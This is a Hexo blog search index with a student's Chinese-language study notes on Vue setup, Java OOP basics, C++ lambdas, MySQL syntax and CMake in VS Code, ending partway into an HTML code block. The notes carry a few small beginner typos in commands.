<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>从零开始vue+spring boot前后端分离项目实战</title>
      <link href="2021/03/04/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8Bvue-java%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E9%A1%B9%E7%9B%AE%E5%AE%9E%E6%88%98/"/>
      <url>2021/03/04/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8Bvue-java%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E9%A1%B9%E7%9B%AE%E5%AE%9E%E6%88%98/</url>
      
        <content type="html"><![CDATA[<h2 id="前言">前言</h2><p>之前在知乎上翻到了尤雨溪大神（vue框架作者）的回答，听说bilibili都开始用vue了就感觉很离谱，后来又了解到前后端分离这种开发模式，时间2021/3/4  目前对springboot还比较陌生，前后端分离项目开发也只听别人说过，关于设计模式之类的也不怎么懂，因为本人也在学习（踩坑）所以此笔记记录可能会有部分错误望谅解。   关于细节会附上官方文档链接</p><h2 id="2021-3-4-vue环境搭建">2021/3/4    vue环境搭建</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g @vue&#x2F;cli</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/hawk9am/blogimage/raw/master/img/20210304161135.png" alt=""></p><p>构建项目</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vue init webpack project1</span><br></pre></td></tr></table></figure><p>这里有个坑 <code>Runtime + Compiler: recommended for most users </code> 运行加编译（推荐选项）<br><code>Runtime-only: about 6KB lighter min+gzip, but templates (or any Vue-specificHTML) are ONLY allowed in .vue files - render functions are required elsewhere</code> 仅运行时<br>选择运行时编译的原因，可以翻回官网文档： <a href="https://cn.vuejs.org/v2/guide/installation.html#%E8%BF%90%E8%A1%8C%E6%97%B6-%E7%BC%96%E8%AF%91%E5%99%A8-vs-%E5%8F%AA%E5%8C%85%E5%90%AB%E8%BF%90%E8%A1%8C%E6%97%B6">https://cn.vuejs.org/v2/guide/installation.html#运行时-编译器-vs-只包含运行时</a></p><p>默认的就选默认，yes的一定yes</p><p><img src="https://gitee.com/hawk9am/blogimage/raw/master/img/20210304162916.png" alt=""></p><p>进入项目文件夹下 构建</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm dev run</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/hawk9am/blogimage/raw/master/img/20210304163344.png" alt=""></p><p>浏览器进入开放的端口号地址，到这其实我感觉跟我折腾博客hexo框架那套流程有点像啊</p><p><img src="https://gitee.com/hawk9am/blogimage/raw/master/img/20210304163134.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 前后端分离 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实战笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA基础学习</title>
      <link href="2021/03/01/JAVA/"/>
      <url>2021/03/01/JAVA/</url>
      
        <content type="html"><![CDATA[<h2 id="继承，多态，抽象类，接口，静态字段-及-方法">继承，多态，抽象类，接口，静态字段 及 方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.company;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner get =<span class="keyword">new</span> Scanner(System.in);</span><br><span class="line"><span class="comment">// write your code here</span></span><br><span class="line">       <span class="comment">/* System.out.println(&quot;hello world !&quot;);</span></span><br><span class="line"><span class="comment">        test01 t= new test01(1,2000,&quot;mzb&quot;,&quot;readme&quot;);  //继承的实例</span></span><br><span class="line"><span class="comment">        t.get_info();</span></span><br><span class="line"><span class="comment">        *</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">       <span class="comment">/* // 接口的实例</span></span><br><span class="line"><span class="comment">        int num = get.nextInt(); ;</span></span><br><span class="line"><span class="comment">        get.nextLine();</span></span><br><span class="line"><span class="comment">        String name = get.nextLine();</span></span><br><span class="line"><span class="comment">        q q1 =new q();</span></span><br><span class="line"><span class="comment">        q1.get_num(num);</span></span><br><span class="line"><span class="comment">        q1.get_name(name);</span></span><br><span class="line"><span class="comment">        q1.print_num();</span></span><br><span class="line"><span class="comment">        q1.print_name();</span></span><br><span class="line"><span class="comment">        *</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        z z1 =<span class="keyword">new</span> z(); <span class="comment">//实例化一个z1</span></span><br><span class="line">        z1.b= <span class="number">2</span>; <span class="comment">//修改默认的 b值从1 变为 2</span></span><br><span class="line">        System.out.println(<span class="string">&quot;z1.b: &quot;</span>+z1.b); <span class="comment">//验证</span></span><br><span class="line">        z z2 =<span class="keyword">new</span> z(); <span class="comment">//实例化一个z2</span></span><br><span class="line">        z2.b= <span class="number">3</span>; <span class="comment">//修改默认的 b 值 从 1 变为 3</span></span><br><span class="line">        System.out.println(<span class="string">&quot;z2.b: &quot;</span>+z2.b); <span class="comment">//验证</span></span><br><span class="line">        System.out.println(z.b+<span class="string">&quot; &quot;</span>+z1.b+<span class="string">&quot; &quot;</span>+ z2.b);  <span class="comment">//理论上应该是1，2，3 但其实这是错的 结果是3 3 3</span></span><br><span class="line">        <span class="comment">/* 解释： 静态数据存储在 “ 静态数据区”这部分的内存地址会一直被占用不会改变</span></span><br><span class="line"><span class="comment">        粗俗的理解 这个b是属于 class的 无论谁修改都是指向那个地址的 ” 值 “</span></span><br><span class="line"><span class="comment">        *</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">抽象类 关键字 abstract</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">int</span> num;</span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">int</span> money;</span><br><span class="line">    <span class="keyword">public</span>  String name;</span><br><span class="line">    <span class="keyword">public</span>  String info;</span><br><span class="line">    test()&#123;&#125;</span><br><span class="line">    test(<span class="keyword">int</span> num ,<span class="keyword">int</span> money ,String name,String info)&#123;</span><br><span class="line">        <span class="keyword">this</span>.num=num;</span><br><span class="line">        <span class="keyword">this</span>.money=money;</span><br><span class="line">        <span class="keyword">this</span>.name=name;</span><br><span class="line">        <span class="keyword">this</span>.info=info;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span>  <span class="title">get_info</span> <span class="params">()</span></span>;  <span class="comment">//注* 抽象类的方法也要加 关键字 abstract</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 从抽象类继承</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test01</span> <span class="keyword">extends</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">int</span> test01_num=<span class="number">2333</span>;</span><br><span class="line">    test01()&#123;&#125;</span><br><span class="line">    test01(<span class="keyword">int</span> num ,<span class="keyword">int</span> money,String name ,String info)&#123;</span><br><span class="line">        <span class="keyword">this</span>.num=num;</span><br><span class="line">        <span class="keyword">this</span>.money=money;</span><br><span class="line">        <span class="keyword">this</span>.name=name;</span><br><span class="line">        <span class="keyword">this</span>.info=info;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="keyword">void</span> <span class="title">get_info</span> <span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(test01_num+<span class="string">&quot; &quot;</span>+num+<span class="string">&quot; &quot;</span>+money+<span class="string">&quot; &quot;</span>+name+<span class="string">&quot; &quot;</span>+info);    <span class="comment">//覆写抽象类的方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">*  接口 关键字 interface</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span>  <span class="title">p</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">get_num</span> <span class="params">(<span class="keyword">int</span> num)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">get_name</span><span class="params">(String name)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">interface</span>  <span class="title">p1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">print_num</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">print_name</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">q</span> <span class="keyword">implements</span> <span class="title">p</span>,<span class="title">p1</span></span>&#123;    <span class="comment">//关键字implements  继承 类可以继承“ 多个 ” 接口</span></span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">int</span> num;</span><br><span class="line">    <span class="keyword">public</span>  String name;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">get_num</span><span class="params">(<span class="keyword">int</span> num)</span></span>&#123; <span class="keyword">this</span>.num=num; &#125;   <span class="comment">//获取编号方法的覆写</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="keyword">void</span> <span class="title">get_name</span><span class="params">(String name)</span></span>&#123;<span class="keyword">this</span>.name=name;&#125;  <span class="comment">//获取名字方法的覆写</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="keyword">void</span> <span class="title">print_num</span><span class="params">()</span></span>&#123;System.out.println(<span class="string">&quot;num:&quot;</span>+<span class="keyword">this</span>.num);&#125;   <span class="comment">//输出编号方法的覆写</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="keyword">void</span> <span class="title">print_name</span><span class="params">()</span></span>&#123;System.out.println(<span class="string">&quot;name:&quot;</span>+<span class="keyword">this</span>.name);&#125;  <span class="comment">//输出名字方法的覆写</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">静态字段 关键字 static</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">z</span> </span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">int</span> a=<span class="number">0</span>;</span><br><span class="line">   <span class="keyword">public</span>  <span class="keyword">static</span> <span class="keyword">int</span> b=<span class="number">1</span>;  <span class="comment">//静态变量 b 初始值：1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="java-classpath和jar及模块-说明">java  classpath和jar及模块 说明</h2><p><strong>什么是classpath</strong></p><p><code>classpath</code>是JVM用到的一个环境变量，它用来指示JVM如何搜索<code>class</code>。</p><p>因为Java是编译型语言，源码文件是<code>.java</code>，而编译后的<code>.class</code>文件才是真正可以被JVM执行的字节码。因此，JVM需要知道，如果要加载一个<code>abc.xyz.Hello</code>的类，应该去哪搜索对应的<code>Hello.class</code>文件。</p><p><strong>什么是jar</strong></p><p>简单描述就是 把 一堆零散的class文件打包，就是个压缩包（一个class文件的容器），压缩成zip之后修改后缀为jar都行，比如java标准库就是个jar包 <code>rt.jar</code></p>]]></content>
      
      
      <categories>
          
          <category> JAVA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>lambda,C++和bug有个约定</title>
      <link href="2021/02/22/lambda-C-%E5%92%8Cbug%E6%9C%89%E4%B8%AA%E7%BA%A6%E5%AE%9A/"/>
      <url>2021/02/22/lambda-C-%E5%92%8Cbug%E6%9C%89%E4%B8%AA%E7%BA%A6%E5%AE%9A/</url>
      
        <content type="html"><![CDATA[<p>Lambda这玩意儿还挺有意思的，在C++11开始引入这一特性。</p><ol><li><p>概念： Lambda 表达式（lambda expression）是一个<a href="https://baike.baidu.com/item/%E5%8C%BF%E5%90%8D%E5%87%BD%E6%95%B0/4337265">匿名函数</a>，Lambda表达式基于数学中的<a href="https://baike.baidu.com/item/%CE%BB%E6%BC%94%E7%AE%97">λ演算</a>得名，直接对应于其中的lambda抽象（lambda abstraction），是一个匿名函数，即没有函数名的函数。Lambda表达式可以表示<a href="https://baike.baidu.com/item/%E9%97%AD%E5%8C%85/10908873">闭包</a>（注意和数学传统意义上的不同）。</p></li><li><p>格式：<code>[]()-&gt;type&#123;&#125;</code></p><p><code>[]</code>：捕获列表</p><p><code>()</code>：参数列表</p><p><code>-&gt;type</code>：函数反悔类型</p><p><code>&#123;&#125;</code>：Lambda函数体</p><p><code>[ ]或[=]</code>：值传递（该方法不可以修改参数），除非这样写<code>[]()mutable-&gt;type&#123;&#125;</code> 可做值修改的操作，但那块内存里的值不会改。</p><p><code>[&amp;]</code>：引用传递，可做值修改</p><p>混合<code>[= ,&amp; x]  [=x ,&amp;]</code></p><p>简单小例子</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> a= <span class="number">0</span>;</span><br><span class="line"><span class="comment">//auto p =[a]()-&gt;int&#123;a++;return 1;&#125;; //error  不允许值做修改</span></span><br><span class="line"><span class="keyword">auto</span> f = [a](<span class="keyword">int</span> b =<span class="number">7</span>) <span class="keyword">mutable</span> -&gt;<span class="keyword">int</span>&#123;a=a+<span class="number">1</span>;<span class="keyword">return</span> b;&#125;; <span class="comment">//bingo！可，但a的值并没有变</span></span><br><span class="line">f();</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;a:&quot;</span>&lt;&lt;a&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="comment">/////////////////////////////////////////////////////</span></span><br><span class="line"><span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">auto</span> p =[&amp;i]()&#123;i++;&#125;; <span class="comment">//值引用</span></span><br><span class="line">p();</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;i:&quot;</span>&lt;&lt;i&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>图片</p><p><img src="https://gitee.com/hawk9am/blogimage/raw/master/img/20210222185718.png" alt=""></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[Running] <span class="built_in">cd</span> <span class="string">&quot;c:\Users\苶苶\Desktop\test\&quot; &amp;&amp; g++ main.cpp -o main &amp;&amp; &quot;</span>c:\Users\苶苶\Desktop\<span class="built_in">test</span>\&quot;main</span><br><span class="line">   a:0</span><br><span class="line">i:1</span><br></pre></td></tr></table></figure><p>关于参数是对象这个可以看看微软文档写的，贼意思。</p><p><img src="https://gitee.com/hawk9am/blogimage/raw/master/img/20210222183927.png" alt=""></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Lambda </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL创建数据库和SQL语法合集</title>
      <link href="2021/02/20/SQL%E8%AF%AD%E6%B3%95%E5%90%88%E9%9B%86/"/>
      <url>2021/02/20/SQL%E8%AF%AD%E6%B3%95%E5%90%88%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h2 id="Mysql创建数据库">Mysql创建数据库</h2><p><strong>创建数据库：</strong></p><p><code>create database  数据库名;</code></p><p><strong>删库</strong></p><p><code>drop database 数据库;</code></p><p><strong>建表</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">create table test_table (</span><br><span class="line">    ID int ,</span><br><span class="line">    number int,</span><br><span class="line">    name varchar (10),</span><br><span class="line">    info varchar (10)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><strong>删表</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop table if exists test_table;</span><br></pre></td></tr></table></figure><p><strong>查看表结构</strong></p><p><code>desc test_table;</code></p><p><strong>编码设置</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">charset uft8; &#x2F;&#x2F;设置成utf8编码存储</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set names gbk; &#x2F;&#x2F;以gbk（中文编码）显示</span><br></pre></td></tr></table></figure><h2 id="查询select">查询select</h2><p>查询所有 <code>select * from user;</code></p><p>查询列 <code>select  name,number from user;</code></p><p>查询刨除不同的 <code>select distinct  name from user;</code></p><p>条件匹配查询 <code>select 列 from 表  where 列 运算符 值;</code></p><p><code>and = &amp;&amp;  or =||</code></p><p>排序 <code>select  显示的列  from 表 order by 被排序列   desc(倒序) asc(正序)</code></p><p><strong>where</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select * from user number,name where 条件</span><br><span class="line">where 在一定范围内筛选 例如 number[10,50]  </span><br><span class="line">where number&gt;&#x3D;10 &amp;&amp; number&lt;&#x3D;50   </span><br><span class="line">&#x2F;&#x2F; &amp;&amp;:和 ||:或</span><br><span class="line">where 在指定元素内筛选 例如 number 是否在[10,20,30,40]当中  </span><br><span class="line">where number in(10,20,30,40)</span><br></pre></td></tr></table></figure><h2 id="插入-insert">插入 insert</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">insert into user ( id, name )  &#x2F;&#x2F;选择标签</span><br><span class="line">values (10, &#39;法外狂徒张三&#39;); 选择标签元素插入        </span><br><span class="line">&#x2F;**</span><br><span class="line">&#x2F;* insert into user (11,法外狂徒张三，21，2000-12-20); &#x2F;&#x2F;插入一条</span><br><span class="line">&#x2F;* insert into user (id ,age)</span><br><span class="line">values (12,22), (13,21),(14,21); &#x2F;&#x2F;插入多条记录</span><br></pre></td></tr></table></figure><h2 id="修改数据">修改数据</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">update user</span><br><span class="line">set name &#x3D;&quot;你大爷的2002&quot; , age &#x3D;55 where number &#x3D; 1;</span><br><span class="line">&#x2F;&#x2F;将number为5 的那条记录 name 和 age做修改</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vscode,C++和CMake</title>
      <link href="2021/02/15/vscode,C++%E5%92%8CCMake/"/>
      <url>2021/02/15/vscode,C++%E5%92%8CCMake/</url>
      
        <content type="html"><![CDATA[<p><strong>之前用Clion写C++多文件结构的时候就用过CMake，写Qt的时候看见了QFile。就一直对MakeFile比较迷惑，大   概学了下CMake，这玩意是真猛</strong></p><h2 id="CMake的概念">CMake的概念</h2><p>CMake就是针对上面问题所设计的工具：它首先允许开发者编写一种平台无关的 CMakeList.txt 文件来定制整个编译流程，然后再根据目标用户的平台进一步生成所需的本地化 Makefile 和工程文件，如 Unix 的 Makefile 或 Windows 的 Visual Studio 工程。从而做到“Write once, run everywhere”。显然，CMake 是一个比上述几种 make 更高级的编译配置工具。一些使用 CMake 作为项目架构系统的知名开源项目有 VTK、ITK、KDE、OpenCV、OSG 等。                     -------------------网上找的</p><h2 id="关于vscode-C-CMake的使用">关于vscode C++ CMake的使用</h2><p>下载合适版本</p><p><img src="https://gitee.com/hawk9am/blogimage/raw/master/img/20210216213736.png" alt=""></p><p>检查版本</p><p><img src="https://gitee.com/hawk9am/blogimage/raw/master/img/20210216214012.png" alt=""></p><p>vsocde 里的 两个插件install</p><p><img src="https://gitee.com/hawk9am/blogimage/raw/master/img/20210215141438.png" alt=""></p><p>首先新建一个测试空文件夹 test ，在vscode打开</p><p><img src="https://gitee.com/hawk9am/blogimage/raw/master/img/20210216215326.png" alt=""></p><p>新建test.cpp</p><p><img src="https://gitee.com/hawk9am/blogimage/raw/master/img/20210216215450.png" alt=""></p><p>并不能编译，要是能编译就怪了QWQ</p><p>命令行中 <code>CMake:Quick Start</code></p><p><img src="https://gitee.com/hawk9am/blogimage/raw/master/img/20210216215601.png" alt=""></p><p><code>select a kit</code> 选择合适的编译器 我这里是mingGW32</p><p><img src="https://gitee.com/hawk9am/blogimage/raw/master/img/20210216215630.png" alt=""></p><p><img src="https://gitee.com/hawk9am/blogimage/raw/master/img/20210216215642.png" alt=""></p><p>然后还是开始快速入门那个命令调出部署下，输入你的工程名字之后会有两个选项，选第二个（我忘了叫啥了）</p><p>会生成 CMakeLists.txt文件，我加了简单的注释，多文件编译直接在这改就行</p><p><img src="https://gitee.com/hawk9am/blogimage/raw/master/img/20210216220041.png" alt=""></p><p>然后你可以点下方的（bulid）生成 或者 进入 bulid目录手动执行</p><p><code>PS C:\Users\苶苶\Desktop\test&gt; cd .\build\ PS C:\Users\苶苶\Desktop\test\build&gt; cmake ..</code></p><p><img src="https://gitee.com/hawk9am/blogimage/raw/master/img/20210216220214.png" alt=""></p><p>hello ! 搞定了</p><p><img src="https://gitee.com/hawk9am/blogimage/raw/master/img/20210216220241.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
            <tag> CMake </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML+CSS单身狗指南</title>
      <link href="2021/02/14/HTML/"/>
      <url>2021/02/14/HTML/</url>
      
        <content type="html"><![CDATA[<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">HTML</span>&gt;</span></span><br><span 